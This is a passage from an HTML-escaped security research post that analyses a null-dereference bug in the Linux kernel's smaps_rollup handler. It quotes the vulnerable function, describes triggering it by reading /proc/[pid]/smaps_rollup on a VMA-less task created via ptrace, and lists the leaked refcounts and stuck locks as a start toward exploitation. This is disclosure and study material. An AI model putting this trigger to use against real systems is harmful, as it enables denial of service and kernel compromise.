class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;task&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;return&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ESRCH&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mm &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;//With no vma&amp;#39;s, mm-&amp;gt;mmap is NULL&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;||&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmget_not_zero&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;))&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;//mm reference taken&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ret &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ESRCH&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;goto&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;out_put_task&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memset&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mss&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;sizeof&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mss&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ret &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;mmap_read_lock_killable&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;//mmap read lock taken&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ret&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;goto&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;out_put_mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hold_task_mempolicy&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;for&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vma &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;vma&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;vma &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;vma&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vm_next&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; smap_gather_stats&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vma&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mss&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; last_vma_end &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;vma&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vm_end&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; show_vma_header_prefix&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;vm_start&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;last_vma_end&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;//the deref of mmap causes a kernel oops here&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; seq_pad&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c27\"&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; seq_puts&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c27\"&gt;&amp;quot;[rollup]\\n&amp;quot;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __show_smap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;m&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mss&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;true&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; release_task_mempolicy&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mmap_read_unlock&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;out_put_mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mmput&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;out_put_task&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; put_task_struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;task&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; priv&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;task &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;return&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;This file is intended simply to print a set of memory usage statistics for the respective process. Regardless, &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://lore.kernel.org/lkml/20221003224531.1930646-1-sethjenkins@google.com/T/\"&gt;this bug report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;reveals a classic and otherwise innocuous null-deref bug within this function. In the case of a task that has no VMA&amp;rsquo;s mapped at all, the task&amp;rsquo;s &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_struct mmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;member will be equal to NULL. Thus the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;priv-&amp;gt;mm-&amp;gt;mmap-&amp;gt;vm_start&lt;/span&gt;&lt;span&gt;&amp;nbsp;access causes a null dereference and consequently a kernel oops. This bug can be triggered by simply &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;read&lt;/span&gt;&lt;span&gt;&amp;rsquo;ing &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;/proc/[pid]/smaps_rollup&lt;/span&gt;&lt;span&gt;&amp;nbsp;on a task with no VMA&amp;rsquo;s (which itself can be stably created via &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;ptrace&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s1138/image1.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s1138/image1.png\" border=\"0\" alt=\"Kernel log showing the oops condition backtrace\" style=\"max-height: 750px; max-width: 600px;\"title=\"Kernel log showing the oops condition backtrace\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c19\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;This kernel oops will mean that the following events occur:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c20 lst-kix_3558t16xb2i9-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;The associated &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;struct file &lt;/span&gt;&lt;span&gt;will have a refcount leaked if &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;fdget&lt;/span&gt;&lt;span&gt;&amp;nbsp;took a refcount &lt;/span&gt;&lt;span&gt;(we&amp;rsquo;ll try and make sure this doesn&amp;rsquo;t happen later)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;The associated &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;seq_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;within the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;struct file&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;has a mutex that will forever be locked (any future reads/writes/lseeks etc. will hang forever).&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;task struct&lt;/span&gt;&lt;span&gt;&amp;nbsp;associated with the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;smaps_rollup&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;file will have a refcount leaked&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_struct&amp;rsquo;s mm_users&lt;/span&gt;&lt;span&gt;&amp;nbsp;refcount&lt;/span&gt;&lt;span&gt;&amp;nbsp;associated with the task will be leaked&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c4 c8 c15 li-bullet-0\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm_struct&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;mmap&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;lock will be permanently readlocked (any future write-lock attempts will hang forever)&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6 EakHiGVfAD-c23\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Each of these conditions is an unintentional side-effect that leads to buggy behaviors, but not all of those behaviors are useful to an attacker. &lt;/span&gt;&lt;span&gt;The permanent locking of events 2 and 5 only makes exploitation more difficult. 